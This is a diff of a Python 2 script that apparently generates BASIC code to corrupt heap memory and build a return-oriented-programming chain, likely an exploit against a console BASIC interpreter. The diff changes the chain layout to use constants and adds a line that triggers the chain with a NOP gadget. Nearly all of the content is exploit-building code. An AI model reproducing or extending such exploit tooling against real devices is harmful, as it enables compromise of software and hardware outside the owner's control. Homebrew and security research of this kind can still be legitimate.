@@ -7,7 +7,7 @@ def emit_w32(offset, val):
     print 'W %u,&H%X' % \
         (offset/4, val)
 
-def emit_hdr(rop_start):
+def emit_hdr():
     print 'BGSCREEN 0,1073741824,2'
 
     # Word offset for the prev-ptr in the heap memchunkhdr immediately following
@@ -19,8 +19,8 @@ def emit_hdr(rop_start):
     print 'B=((B1 OR (B0 << 16))+%u)/4' % (0x10+TABLE_BASE_OFFSET)
 
     print 'DEF W A,V'
-    print '  BGPUT 0,A+%u-B,0,V>>16' % (rop_start/4)
-    print '  BGPUT 0,A+%u-B,1,V' % (rop_start/4)
+    print '  BGPUT 0,A+%u-B,0,V>>16' % (ROP_START/4)
+    print '  BGPUT 0,A+%u-B,1,V' % (ROP_START/4)
     print 'END'
     print ''
 
@@ -66,9 +66,10 @@ class SafeAddr:
     def __init__(self, off):
         self.off = off
 
-def emit_rop(start, end, safe, rop):
+def emit_rop(rop):
     # Rop chain.
-    rop_addr = start
+    end = ROP_START + len(rop)*4
+    rop_addr = ROP_START
     rop_offset = 0
     data = []
     for val in rop:
@@ -78,7 +79,7 @@ def emit_rop(start, end, safe, rop):
         elif isinstance(val, RelativeAddr):
             emit_w32(rop_offset, rop_addr + val.off)
         elif isinstance(val, SafeAddr):
-            emit_w32(rop_offset, safe + val.off)
+            emit_w32(rop_offset, ROP_SAFE + val.off)
         elif type(val) == int:
             emit_w32(rop_offset, val)
         else:
@@ -87,11 +88,13 @@ def emit_rop(start, end, safe, rop):
         rop_addr += 4
         rop_offset += 4
 
-    # Space.
-    print ''
-
     # Data.
+    print ''
     rop_addr = end
     for val in data:
-        emit_w32(rop_addr - start, val)
+        emit_w32(rop_addr - ROP_START, val)
         rop_addr += 4
+
+    # Trigger rop.
+    print ''
+    emit_w32(-4, GADGET_NOP)
